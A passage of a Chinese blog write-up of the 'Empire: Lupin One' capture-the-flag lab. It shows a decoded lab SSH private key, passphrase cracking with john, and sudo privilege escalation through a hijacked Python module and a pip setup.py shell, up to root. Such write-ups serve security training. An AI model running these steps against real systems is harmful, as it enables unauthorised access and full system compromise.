class="hljs-symbol">NUF6</span>DwbFq<span class="hljs-number">5</span>d<span class="hljs-number">4</span>CTL<span class="hljs-symbol">N6</span>jxtCFs<span class="hljs-number">3</span>XmoKquzEY<span class="hljs-number">7</span>MiCzRaq<span class="hljs-number">3</span>kB<span class="hljs-symbol">NAFYNCoVxRBU3</span>d<span class="hljs-number">3</span>aXfLX<span class="hljs-number">4</span>rZXEDBfAgtumkRRmWowk<span class="hljs-symbol">Njs2</span>JDZmzS<span class="hljs-number">4</span>H<span class="hljs-number">8</span><span class="hljs-symbol">nawmMa1</span>PYmrr<span class="hljs-number">7</span>a<span class="hljs-symbol">NDPEW2</span>wdbjZurKAZhheoEYCvP<span class="hljs-number">9</span>dfqdbL<span class="hljs-number">9</span>gPrWf<span class="hljs-symbol">NBJyVBXRD8</span>EZwFZ<span class="hljs-symbol">NKb1</span>eWPh<span class="hljs-number">1</span>sYzUbPPhgruxWA<span class="hljs-symbol">NCH52</span>gQpfAT<span class="hljs-symbol">NqmtTJZFjsfpiXLQjdBxdzfz7</span>pWvK<span class="hljs-number">8</span>jivh<span class="hljs-symbol">nQaiajW3</span>pwt<span class="hljs-number">4</span>cZxwMfcrrJke<span class="hljs-number">14</span>v<span class="hljs-symbol">N8</span>Xbyqdr<span class="hljs-number">9</span>zLFjZDJ<span class="hljs-number">7</span><span class="hljs-symbol">nLdmuXTwxPwD8</span>Seoq<span class="hljs-number">2</span>hYEhR<span class="hljs-number">97</span>D<span class="hljs-symbol">nKfMY2</span>LhoWGaHoFqycPCaX<span class="hljs-number">5</span>FCP<span class="hljs-symbol">Nf9</span>CFt<span class="hljs-number">4</span><span class="hljs-symbol">n4</span><span class="hljs-symbol">nYGLau7</span>ci<span class="hljs-number">5</span>uC<span class="hljs-number">7</span>ZmssiT<span class="hljs-number">1</span>jHTjKy<span class="hljs-number">7</span>J<span class="hljs-number">9</span>a<span class="hljs-number">4</span>q<span class="hljs-number">614</span>GFDdZULTkw<span class="hljs-number">8</span>Pmh<span class="hljs-number">92</span>fuTdK<span class="hljs-number">7</span>Z<span class="hljs-number">6</span>fweY<span class="hljs-number">4</span>hZyGdUXGtPXveXwGWES<span class="hljs-number">36</span>ecCpYXPSPw<span class="hljs-number">6</span>ptVb<span class="hljs-number">9</span>RxC<span class="hljs-number">81</span>AZFPG<span class="hljs-symbol">nts85</span>PYS<span class="hljs-number">6</span>aD<span class="hljs-number">2</span>eUmge<span class="hljs-number">6</span>KGzFopMjYLma<span class="hljs-number">85</span>X<span class="hljs-number">55</span>Pu<span class="hljs-number">4</span>tCxyF<span class="hljs-number">2</span>FR<span class="hljs-number">9</span>E<span class="hljs-number">3</span>c<span class="hljs-number">2</span>zxtry<span class="hljs-name">G6</span><span class="hljs-symbol">N2</span>oVT<span class="hljs-symbol">nyZt23</span>YrEhEe<span class="hljs-number">9</span>kcCX<span class="hljs-number">59</span>RdhrDr<span class="hljs-number">71</span>Z<span class="hljs-number">3</span>zgQkAs<span class="hljs-number">8</span>uPM<span class="hljs-name">M1</span>JPvM<span class="hljs-symbol">NgdyNzpgEGGgj9</span>czgBa<span class="hljs-symbol">N5</span>PWrpPBWft<span class="hljs-name">g9</span>fte<span class="hljs-number">4</span>xYyvJ<span class="hljs-number">1</span>BF<span class="hljs-symbol">N5</span>WDvTYfhUtc<span class="hljs-symbol">n1</span>oRTDow<span class="hljs-number">67</span>w<span class="hljs-number">5</span>zz<span class="hljs-number">3</span>adjLD<span class="hljs-symbol">nXLQc6</span>MaowZJ<span class="hljs-number">2</span>zyh<span class="hljs-number">4</span>PAc<span class="hljs-number">1</span>vpstCRtKQt<span class="hljs-number">35</span>JEdwfwUe<span class="hljs-number">4</span>wz<span class="hljs-symbol">Nr3</span>sidChW<span class="hljs-number">8</span>VuMU<span class="hljs-number">1</span>Lz<span class="hljs-number">1</span>cAj<span class="hljs-attr">vcVHEp1</span>Sab<span class="hljs-meta">o8</span>FprJwJgRs<span class="hljs-number">5</span>ZPA<span class="hljs-number">7</span>Ve<span class="hljs-number">6</span>LDW<span class="hljs-number">7</span>hFa<span class="hljs-symbol">ngK8</span>YwZmRCmXxArBFVwjfV<span class="hljs-number">2</span>SjyhTjhdqswJE<span class="hljs-number">5</span><span class="hljs-symbol">nP6</span>pV<span class="hljs-symbol">nshbV8</span>Zq<span class="hljs-name">G2</span>L<span class="hljs-number">8</span>d<span class="hljs-number">1</span>cwhxpxggmu<span class="hljs-number">1</span>jByELxVHF<span class="hljs-number">1</span>C<span class="hljs-number">9</span>T<span class="hljs-number">3</span>GgLDvgUv<span class="hljs-number">8</span><span class="hljs-symbol">nc7</span>PEJYoXpCoyCs<span class="hljs-number">55</span>r<span class="hljs-number">35</span>h<span class="hljs-number">9</span>YzfKgjcJkvFTdfPHwW<span class="hljs-number">8</span>fSjCVBuUTKSEAvkRr<span class="hljs-number">6</span>iLj<span class="hljs-number">6</span>H<span class="hljs-number">4</span>LEjB<span class="hljs-name">g256</span><span class="hljs-name">G4</span>DHHqpwTgYFtejc<span class="hljs-number">8</span><span class="hljs-symbol">nLX77</span>LUoVmACLvfC<span class="hljs-number">439</span>jtVdxCtYA<span class="hljs-number">6</span>y<span class="hljs-number">2</span>vj<span class="hljs-number">7</span>ZDeX<span class="hljs-number">7</span>zp<span class="hljs-number">2</span>VYR<span class="hljs-number">89</span>GmSqEWj<span class="hljs-number">3</span>doqdahv<span class="hljs-number">1</span>DktvtQcRBiizMg<span class="hljs-symbol">NWYsjMWRM4</span>BPSc<span class="hljs-symbol">nn92</span><span class="hljs-symbol">ncLD1</span>Bw<span class="hljs-number">5</span>ioB<span class="hljs-number">8</span><span class="hljs-symbol">NyZ9</span>C<span class="hljs-symbol">NkMNk4</span>Pf<span class="hljs-number">7</span>Uqa<span class="hljs-number">7</span><span class="hljs-attr">vCTgw4</span>VJv<span class="hljs-attr">vSjE6</span>PRF<span class="hljs-symbol">nqDSrg4</span>avGUqeMUm<span class="hljs-symbol">ngc5</span>m<span class="hljs-symbol">N6</span>WEa<span class="hljs-number">3</span>pxHpkh<span class="hljs-name">G8</span>Z<span class="hljs-symbol">ngCqKvVhegBAVi7</span><span class="hljs-symbol">nDBTwukqEDeCS46</span>UczhXMFbAg<span class="hljs-symbol">nQWhExas547</span><span class="hljs-attr">vCXho71</span>gcmVqu<span class="hljs-number">2</span>x<span class="hljs-number">5</span>EAPFgJqyvMmRScQxiKrYoK<span class="hljs-number">3</span>p<span class="hljs-number">279</span>KLAyS<span class="hljs-name">M4</span>v<span class="hljs-symbol">NcRxrRrR2</span>DYQwhe<span class="hljs-number">8</span>Yj<span class="hljs-symbol">Nsf8</span>MzqjX<span class="hljs-number">54</span>mhbWcjz<span class="hljs-number">3</span>jeXoko<span class="hljs-symbol">nVk77</span>P<span class="hljs-number">9</span><span class="hljs-name">g9</span>y<span class="hljs-number">69</span>DVzJeYUvfX<span class="hljs-attr">VCjPWi7</span>aDDA<span class="hljs-number">7</span>HdQd<span class="hljs-number">2</span>UpCghEGtWSfEJtDgPxurPq<span class="hljs-number">8</span>qJQh<span class="hljs-number">3</span><span class="hljs-symbol">N75</span>YF<span class="hljs-number">8</span>KeQzJs<span class="hljs-number">77</span>Tpwcdv<span class="hljs-number">2</span>Wuvi<span class="hljs-number">1</span>L<span class="hljs-number">5</span>ZZtppbWymsgZckW<span class="hljs-symbol">nkg5</span><span class="hljs-symbol">NB9</span>Pp<span class="hljs-number">5</span>izVXCiFhobqF<span class="hljs-number">2</span>vd<span class="hljs-number">2</span>jh<span class="hljs-name">g4</span>rcpLZ<span class="hljs-symbol">nGdmmEotL7</span>CfRdVwUWpVppHRZzq<span class="hljs-number">7</span>FEQQFxkRL<span class="hljs-number">7</span>JzGoL<span class="hljs-number">8</span>R<span class="hljs-number">8</span>wQ<span class="hljs-name">G1</span>UyB<span class="hljs-symbol">NKPBbVnc7</span>jGyJqFuj<span class="hljs-attr">vCLt6</span>yMUEYXKQTipmEhx<span class="hljs-number">4</span>rXJZK<span class="hljs-number">3</span>aKdbucKhGqMYMH<span class="hljs-symbol">nVbtpLrQUaPZHsiNGUcEd64</span>KW<span class="hljs-number">5</span>kZ<span class="hljs-number">7</span>svohTC<span class="hljs-number">5</span>i<span class="hljs-number">4</span>L<span class="hljs-number">4</span>TuEzRZEyWy<span class="hljs-number">6</span>v<span class="hljs-number">2</span>GGiEp<span class="hljs-number">4</span>Mf<span class="hljs-number">2</span>oEHMUwqto<span class="hljs-symbol">NXbsGp8</span>sbJbZATFLXVbP<span class="hljs-number">3</span>PgBw<span class="hljs-number">8</span>rgAakz<span class="hljs-number">7</span>QBFAGryQ<span class="hljs-number">3</span>t<span class="hljs-symbol">nxytWNuHWkPohMMKUiDFeRyLi8</span>HGUdocwZFzdkbffv<span class="hljs-meta">o8</span>HaewPYF<span class="hljs-symbol">NsPDCn1</span>PwgS<span class="hljs-number">8</span>wA<span class="hljs-number">9</span>agCX<span class="hljs-number">5</span>kZbKWBmU<span class="hljs-number">2</span>zpCstqFAxXeQd<span class="hljs-number">8</span>LiwZzPdsbF<span class="hljs-number">2</span>YZEKz<span class="hljs-symbol">NYtckW5</span>RrFa<span class="hljs-number">5</span>zDgK<span class="hljs-name">m2</span>gSR<span class="hljs-symbol">N8</span>gHz<span class="hljs-number">3</span>WqS<br></code></pre></td></tr></table></figure><p>base64 解密后是乱码，base 的都试了下，最终确定是 base58 加密：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs awk">-----<span class="hljs-keyword">BEGIN</span> OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp<br>PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk<br><span class="hljs-number">9</span>GXiytplgT9z<span class="hljs-regexp">/mP91NqOU9QoAwop5JNxhEfm/</span>j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9<br>H6NSb0jMbMc4soFrBinoLEkx894B<span class="hljs-regexp">/PqUTODesMEV/</span>aK22UKegdwlJ9Arf+<span class="hljs-number">1</span>Y48V86gkzS6<br>xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7<br>J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0<span class="hljs-regexp">/nRfCaOrIzPfZ/</span>NNYgu<br>/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0<br>ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I<br>he0cLdyv316bFI8O+<span class="hljs-number">3</span>y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf<br>XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA<br>hzXJi4LGZ6mjaGEil+<span class="hljs-number">9</span>g4U7pjtEAqYv1+<span class="hljs-number">3</span>x8F+zuiZsVdMr/<span class="hljs-number">66</span>Ma4e6iwPLqmtzt3UiFGb<br><span class="hljs-number">4</span>Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq<br>mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp<br>MkMcBnzD9uynCjhZ9ijaPY<span class="hljs-regexp">/vMY7mtHZNCY8SeoWAxYXToKy2cu/</span>+pVyGQ76KYt3J0AT7wA<br><span class="hljs-number">2</span>OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG<span class="hljs-regexp">/b7z6zGvVxZca/g</span>572CXxXSXlb<br>QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+<span class="hljs-number">34</span>tK+kUoEaVAbwU+IchYyM8ZarSvHVpE<br>vFUPiANSHCZ<span class="hljs-regexp">/b+pdKQtBzTk5/</span>VH<span class="hljs-regexp">/Jk3QPcH69EJyx8/g</span>RE/glQY6z6nC6uoG4AkIl+gOxZ<br><span class="hljs-number">0</span>hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft<br>rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB<br>QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy<br>x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG<br>nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5<br>VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO<br>cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh<br>nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm<br><span class="hljs-number">8</span>UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+<span class="hljs-number">4</span>/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH<br>zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw<br>n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl<br>AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93<br>oVb4p<span class="hljs-regexp">/rHHqqPNMNwM1ns+adF7REjzFwr4/</span>trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI<br><span class="hljs-number">63</span>RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV<br>y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+<br>t<span class="hljs-regexp">/YYhQ/</span>r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2<br>Ays8pHGynylFMDTn13gPJTYJhLDO4H9+<span class="hljs-number">7</span>dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU<br>yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI<br><span class="hljs-number">8</span>nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU<br>mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+<span class="hljs-number">4</span>Qa4+oVk9ZluLBxeu22r<br>VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x<span class="hljs-regexp">/IUt/</span>FP8Nq964pD7m/dPHQ<br>E8<span class="hljs-regexp">/oh4V1NTGWrDsK3AbLk/</span>MrgROSg7Ic4BS/<span class="hljs-number">8</span>IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ<br>BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+<span class="hljs-number">31</span>qP80O/+Kk9NUWalsz+<span class="hljs-number">6</span>Kt2<br>yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+<br>wDSuOKenqc71GfvgmVOUypYTtoI527fiF/<span class="hljs-number">9</span>rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P<br><span class="hljs-number">5</span>KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8<br>vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ<br>Qb50sQsJUxKkuMyfvDQC9wyhYnH0/<span class="hljs-number">4</span>m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB<br><span class="hljs-number">1</span>bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB<br>ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/<span class="hljs-number">4</span>ORlsC<br>iUJ66WmRUN9EoVlkeCzQJwivI=<br>-----<span class="hljs-keyword">END</span> OPENSSH PRIVATE KEY-----<br><br></code></pre></td></tr></table></figure><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>虽然提示是破解私钥，但先试一下能不能使用私钥直接登录：</p><blockquote><p>私钥文件权限应该为 600，且私钥文件最后要有回车</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls -l rsa</span><br>-rw-r--r-- 1 kali kali 3433 Jul  2 06:00 rsa<br>                                                                                                             $ ssh icex64@192.168.135.152 -i rsa<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @<br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>Permissions 0777 for &#x27;rsa&#x27; are too open.<br>It is required that your private key files are NOT accessible by others.<br>This private key will be ignored.<br>Load key &quot;rsa&quot;: bad permissions<br>icex64@192.168.135.152&#x27;s password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> chmod 600 rsa</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls -l rsa</span>                        <br>-rw------- 1 kali kali 3433 Jul  2 06:00 rsa<br>                                                                                                             $ ssh icex64@192.168.135.152 -i rsa<br>Load key &quot;rsa&quot;: invalid format<br>icex64@192.168.135.152&#x27;s password: <br>Permission denied, please try again.<br>icex64@192.168.135.152&#x27;s password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh icex64@192.168.135.152 -i rsa</span>                                                                         <br>Enter passphrase for key &#x27;rsa&#x27;: <br></code></pre></td></tr></table></figure><p>需要私钥的密码，使用 ssh2john 转换文件，并使用 john 爆破，得到密码 <code>P@55w0rd!</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /usr/share/john/ssh2john.py rsa &gt; passwd.txt; john passwd.txt --wordlist=/usr/share/wordlists/fasttrack.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes<br>Cost 2 (iteration count) is 16 for all loaded hashes<br>Will run 4 OpenMP threads<br>Note: This format may emit false positives, so it will keep trying even after<br>finding a possible candidate.<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>P@55w0rd!        (rsa)<br>P@55w0rd!        (rsa)<br>P@55w0rd!        (rsa)<br>3g 0:00:00:06 DONE (2022-07-02 06:09) 0.4360g/s 32.26p/s 32.26c/s 32.26C/s 2003..starwars<br>Session completed<br></code></pre></td></tr></table></figure><p>登录 SSH：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh icex64@192.168.135.152 -i rsa</span>                                                                         <br>Enter passphrase for key &#x27;rsa&#x27;: <br>Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#######################################</span></span><br>Welcome to Empire: Lupin One<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#######################################</span></span><br>Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4<br>icex64@LupinOne:~$ id<br>uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>通过 sudo 权限执行 python 文件，将权限提升至 arsene，再通过 sudo 权限执行 pip ，将权限提升至 root 。</p><blockquote><p>Link：<a href="https://gtfobins.github.io">https://gtfobins.github.io</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs shell">icex64@LupinOne:~$ sudo -l<br>Matching Defaults entries for icex64 on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User icex64 may run the following commands on LupinOne:<br>    (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py<br>icex64@LupinOne:~$ ls -l /home/arsene/heist.py<br>-rw-r--r-- 1 arsene arsene 118 Oct  4  2021 /home/arsene/heist.py<br>icex64@LupinOne:~$ cat /home/arsene/heist.py<br>import webbrowser<br><br>print (&quot;Its not yet ready to get in action&quot;)<br><br>webbrowser.open(&quot;https://empirecybersecurity.co.mz&quot;)<br>icex64@LupinOne:~$ find / -name webbrowser.py 2&gt;/dev/null<br>/usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ ls -l /usr/lib/python3.9/webbrowser.py<br>-rwxrwxrwx 1 root root 24087 Oct  4  2021 /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ echo &#x27;import os\nos.system(&quot;/bin/bash&quot;)&#x27; &gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br>Traceback (most recent call last):<br>  File &quot;/home/arsene/heist.py&quot;, line 1, in &lt;module&gt;<br>    import webbrowser<br>  File &quot;/usr/lib/python3.9/webbrowser.py&quot;, line 1<br>    import os\nos.system(&quot;/bin/bash&quot;)<br>SyntaxError: unexpected character after line continuation character<br>icex64@LupinOne:~$ cat /usr/lib/python3.9/webbrowser.py<br>import os\nos.system(&quot;/bin/bash&quot;)<br>icex64@LupinOne:~$ echo &#x27;import os&#x27; &gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ echo &#x27;os.system(&quot;/bin/bash&quot;)&#x27; &gt;&gt; /usr/lib/python3.9/webbrowser.py<br>icex64@LupinOne:~$ cat /usr/lib/python3.9/webbrowser.py<br>import os<br>os.system(&quot;/bin/bash&quot;)<br>icex64@LupinOne:~$ sudo /usr/bin/python3.9 /home/arsene/heist.py<br>[sudo] password for icex64: <br>Sorry, try again.<br>[sudo] password for icex64: <br>sudo: 1 incorrect password attempt<br>icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py<br>arsene@LupinOne:/home/icex64$ id<br>uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>arsene@LupinOne:/home/icex64$ sudo -l<br>Matching Defaults entries for arsene on LupinOne:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User arsene may run the following commands on LupinOne:<br>    (root) NOPASSWD: /usr/bin/pip<br>arsene@LupinOne:/home/icex64$ TF=$(mktemp -d)<br>arsene@LupinOne:/home/icex64$ echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py<br>arsene@LupinOne:/home/icex64$ sudo pip install $TF<br>Processing /tmp/tmp.tCNxFRVsTv<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=0(root) gid=0(root) groups=0(root)<br><span class="hljs-meta">#</span><span class="bash"> ls /root</span><br>root.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /root/root.txt</span><br>3mp!r3&#123;congratulations_you_manage_to_pwn_the_lupin1_box&#125;<br>See you on the next heist.<br><span class="hljs-meta">#</span><span class="bash"> ls /home</span><br>arsene  icex64<br><span class="hljs-meta">#</span><span class="bash"> ls /home/icex64</span>      <br>user.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /home/icex64/user.txt</span><br>3mp!r3&#123;I_See_That_You_Manage_To_Get_My_Bunny&#125;<br><span class="hljs-meta">#</span><span class="bash"> ls /home/arsene</span><br>heist.py  note.txt<br><span class="hljs-meta">#</span><span class="bash"> cat /home/arsene/note.txt</span><br>Hi my friend Icex64,<br>Can you please help check if my code is secure to run, I need to use for my next heist.<br>I dont want to anyone else get inside it, because it can compromise my account and find my secret file.<br>Only you have access to my program, because I know that your account is secure.<br>See you on the other side.<br>Arsene Lupin.<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、目录扫描：fuff、wfuzz</p><p>2、文件泄露：rsa 私钥</p><p>3、base58解码、ssh2john、john破解</p><p>4、sudo 提权：python文件、pip</p><h2 